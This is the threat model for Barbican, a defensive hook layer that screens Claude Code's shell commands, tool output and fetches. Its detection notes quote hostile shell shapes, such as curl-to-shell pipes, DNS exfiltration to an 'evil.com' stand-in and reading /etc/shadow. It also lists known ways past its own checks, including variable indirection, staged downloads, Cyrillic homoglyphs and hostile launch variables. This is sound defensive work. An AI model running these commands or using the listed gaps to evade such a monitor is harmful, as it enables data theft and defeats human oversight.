# Barbican threat model

Barbican sits on the `PreToolUse` / `PostToolUse` hook boundary of Claude Code and exposes an MCP server at `~/.claude/barbican/barbican mcp-serve`. A bug in Barbican is a bug in the safety floor of the user's entire Claude Code session — treat every finding that way.

This document enumerates what Barbican tries to defend against, what it explicitly does not defend against, the known parser limits, and the configuration knobs.

## In scope — Barbican's job

- **Bash composition attacks** detected pre-execution:
  - `curl | <shell>` / `wget | <shell>` including absolute-path variants (audit H1).
  - Base64 / xxd / openssl pipelines writing to an execution target (audit H2).
  - Re-entry wrappers that hide inner commands (`find -exec`, `xargs`, `sudo`, `timeout`, `nohup`, `env`, `watch`, `nice`, `parallel`, `su -c`, `doas`, `runuser`, `setsid`, `stdbuf`, `unbuffer`) (audit M1).
  - DNS-channel exfil (`dig`, `host`, `nslookup`, `drill`, `resolvectl`) (audit M2).
- **Prompt-injection patterns** in PostToolUse tool output, with Unicode awareness:
  - NFKC normalization before matching (fullwidth Latin, mathematical alphanumerics, compatibility ligatures) (audit M3).
  - Zero-width + bidi-override + isolate stripping (`U+200B`/`200C`/`200D`/`FEFF`, `U+202A..202E`, `U+2066..2069`) (audit M3).
  - Payload scan default cap 5 MB (configurable) with explicit truncation warning in the audit log (audit M3).
- **SSRF hardening** in `safe_fetch`:
  - Reject hostnames resolving to RFC1918, loopback, link-local, CGNAT (100.64/10), IMDS (169.254.169.254, fd00:ec2::254).
  - Reject raw IP literals unless `BARBICAN_ALLOW_IP_LITERALS=1`.
  - DNS-pin: resolve once, connect by IP, send original Host header (defeats DNS rebinding) (audit M4).
- **`safe_read` sensitive-path denial** by default (opt-out `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`) (audit L3).
- **Audit log hygiene**: ANSI escapes stripped (L1), files created with mode `0o600` (L2).

## Out of scope — explicit non-goals

Barbican does not defend against these classes; the user's operating environment or Claude Code itself must.

- **The underlying model being asked to produce malicious code that Barbican's parser can't classify.** If `tree-sitter-bash` cannot parse a construct, Barbican denies it (deny-by-default rule). We do not attempt to outsmart adversarial bash grammars.
- **Kernel / hypervisor exploits, TOCTOU against the filesystem.** Barbican runs as the same user as Claude Code with no privilege boundary. In particular, `safe_read` canonicalizes + policy-checks before calling `File::open`; a concurrent attacker who swaps a path component between the check and the open can defeat the policy. Our defense is to canonicalize through symlinks at both check time and read time; we do not attempt `open(O_NOFOLLOW) + fstat` re-verification.
- **Hardlinks to deny-listed targets.** `safe_read` blocks by canonical path; hardlinks share an inode and cannot be distinguished from the original file through path-based policy. If an attacker can create a hardlink from an allowed path to `/etc/shadow` on the same filesystem, they can exfiltrate it. Defense-in-depth here belongs to filesystem permissions.
- **Claude Code itself being compromised.** A modified Claude Code binary can bypass its own hooks.
- **The user granting Claude Code broad permissions outside of Barbican's scope** (e.g. enabling arbitrary MCP servers with no safety layer).
- **Prompt injection via attachments Claude Code hasn't yet rendered through a hook** (e.g. a PDF read directly by the model without triggering a PostToolUse hook we observe).
- **Confusables outside NFKC.** Specifically: Cyrillic `і` (U+0456) is NFKC-distinct from Latin `i` (U+0069). Catching Cyrillic-vs-Latin homoglyph attacks requires a dedicated confusables normalization pass, which is future work. A test in `sanitize.rs` documents this limit.
- **Process-level side channels** (timing, thermal, power) and network-level traffic analysis.
- **Untrusted-launch environment.** An attacker who controls the Barbican process's environment at launch (e.g. a hostile `.envrc` the user direnv-allowed, a compromised parent shell, a malicious Claude Code replacement) can set `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`, `BARBICAN_SAFE_READ_ALLOW=/absolute/secret`, `BARBICAN_ALLOW_IP_LITERALS=1`, `BARBICAN_ALLOW_MALFORMED_HOOK_JSON=1`, or set `HOME` to relocate the deny-list base and the audit log. All of these are documented opt-outs — by the time the attacker has this foothold, they can also set `PATH`, `LD_PRELOAD`, or replace the Barbican binary outright. Barbican does not attempt to outrun a hostile launcher; defense-in-depth here belongs to the user's trust in their shell startup.

## Known parser limits

Cases where `tree-sitter-bash` or our wrapper can't classify an expression with confidence, and the Barbican response. Deny-by-default applies to all of these unless explicitly noted; per-phase tests pin the current behavior so later work can't regress it.

### Parser-level (hard-deny)

Every input the parser rejects collapses to `ParseError::Malformed` and the hook exits with the Claude Code block code. The walker rejects:

- **Unclean tree-sitter parse** — unterminated quotes, unmatched parens, truncated heredocs. `tree.root_node().has_error()` is the signal.
- **Unrepresentable pipeline stages** — any stage that isn't a bare `command` or `redirected_statement{command}`. In particular `curl … | (bash)`, `curl … | { bash; }`, `curl … | if true; then bash; fi` are all rejected, because the wrapping construct hides the inner sink from classifiers.
- **Compound/subshell/control-flow body carrying a trailing redirect** — `{ cat /etc/shadow; } > /tmp/x.sh`, `( cmd ) > /tmp/x`. The redirect cannot be safely attributed to any one inner command, and the shape is the H2 attack surface.
- **Invalid UTF-8 byte boundaries inside a node range** — defensive; `&str` input guarantees UTF-8 at the buffer level but a grammar bug producing a non-boundary range would otherwise silently drop bytes.
- **Recursion deeper than `MAX_DEPTH = 100`** — defense-in-depth against stack-overflow DoS from nested `$(…)`.

### Classifier-level (documented limits by phase)

These inputs parse cleanly but are outside the scope of the phase that shipped the current classifier. Later phases close them; tests pin the current behavior.

- **H1 network-tool scope is `curl`/`wget` only.** Per Narthex parity, the H1 pipeline classifier denies only `curl`/`wget` piped to a shell interpreter. Other egress channels in `NETWORK_TOOLS_HARD` (`nc`, `ncat`, `socat`, `ssh`, `dig`, `host`, `nslookup`, `drill`, `resolvectl`) are not H1's job — they are the M2 classifier's responsibility (Phase 5), where DNS-exfil composition (`cat secret | dig {}.evil.com`) is detected. Pinned by `nc_pipe_bash_allows_h1_is_curl_wget_only` and siblings.
- **Variable indirection on `argv[0]`** — e.g. `CURL=/usr/bin/curl; $CURL https://x | bash`. The parser surfaces `$CURL` as the basename, not `curl`, so the H1 classifier doesn't match. Requires variable tracking which Phase 2 does not ship. Pinned by `variable_indirection_allows_phase2_does_not_resolve_vars`.
- **Staged writes without a pipeline** — `wget -O /tmp/s.sh; bash /tmp/s.sh`. Phase 2 H1 only classifies within-pipeline shapes; the cross-command staging pattern is Phase 3 H2. Pinned by `two_pipelines_curl_then_bash_allows_h1_is_per_pipeline`.
- **`bash -c "$(curl …)"`** — the substitution contains a bare `curl` with no `|bash` inside, so H1's within-pipeline rule doesn't fire. The re-entry wrapper classifier in Phase 4 M1 will catch this by gating `bash -c <sub>` on the sub's contents. Pinned by `bash_dash_c_curl_substitution_allows_for_now_phase4_m1`.
- **Cyrillic confusables in PostToolUse scan** — NFKC normalization is applied, but NFKC does not map Cyrillic `і` (U+0456) to Latin `i`. A dedicated confusables pass would catch this class; not yet shipped. Pinned by `nfkc_does_not_map_cyrillic_i`.
- **Heredoc body capture** — the IR captures the heredoc delimiter (with surrounding quoting) so classifiers can distinguish quoted from unquoted forms. The body itself is not yet surfaced to classifiers; a later phase will if H2/M1 need it.

## Configuration

All knobs are environment variables read at process start; none are persistent on disk.

| Variable | Default | Meaning |
|---|---|---|
| `BARBICAN_LOG` | `warn` | `tracing` env-filter for stderr logs. |
| `BARBICAN_SCAN_MAX_BYTES` | `5242880` (5 MB) | Max bytes scanned for injection patterns; larger inputs emit a `scan-truncated` warning. (M3) |
| `BARBICAN_GIT_HARD_DENY` | `0` | If `1`, promote `git` from ask-list to hard network-tools deny. |
| `BARBICAN_ALLOW_IP_LITERALS` | `0` | If `1`, `safe_fetch` accepts raw IP literals (still subject to SSRF filter). (M4) |
| `BARBICAN_SAFE_READ_ALLOW_SENSITIVE` | `0` | If `1`, `safe_read` permits reads under `~/.ssh/`, `~/.aws/`, etc. (L3) |
| `BARBICAN_SAFE_READ_EXTRA_DENY` | _(empty)_ | Colon-separated path prefixes to add to the sensitive list. |
| `BARBICAN_SAFE_READ_ALLOW` | _(empty)_ | Colon-separated paths to carve exact-match holes in the deny list. |
| `BARBICAN_SAFE_READ_MAX_BYTES` | `1048576` (1 MiB) | Default `safe_read` cap. Callers can override per-call; clamped to 10 MiB. |

The rule for new knobs: **strict default, named opt-out, documented here**. Never silently weaken a check; if a real false positive surfaces, add a knob.

## Known advisories we ignore (with rationale)

CI runs `cargo audit --deny warnings` with a narrow allowlist. Any entry here must include: advisory ID, advisory URL, why the vulnerable code is not reachable in Barbican, and what would invalidate the ignore.

- **RUSTSEC-2026-0118** (`hickory-proto 0.26.1`) — NSEC3 closest-encloser proof validation enters an unbounded loop on cross-zone responses. The vulnerable code lives in hickory-proto's DNSSEC validation path. Barbican pulls hickory-resolver with `default-features = false` and only enables `system-config` + `tokio`; no `dnssec-*` feature is enabled, so the NSEC3 validator is never compiled in. Advisory: https://github.com/hickory-dns/hickory-dns/security/advisories/GHSA-3v94-mw7p-v465. **Invalidates the ignore:** enabling any DNSSEC feature on hickory-resolver, or a future hickory-proto release that enables the affected code unconditionally — at which point the ignore must be dropped and the dep upgraded.

## Reporting security issues

- Private report: open a [security advisory on GitHub](https://github.com/jdidion/barbican/security/advisories/new).
- If that is not available, email the maintainer (address in `Cargo.toml` / GitHub profile).
- Please include a minimal reproduction (the exact JSON fed to `barbican pre-bash` / `post-mcp` / etc.) and the Barbican version (`barbican --version`).
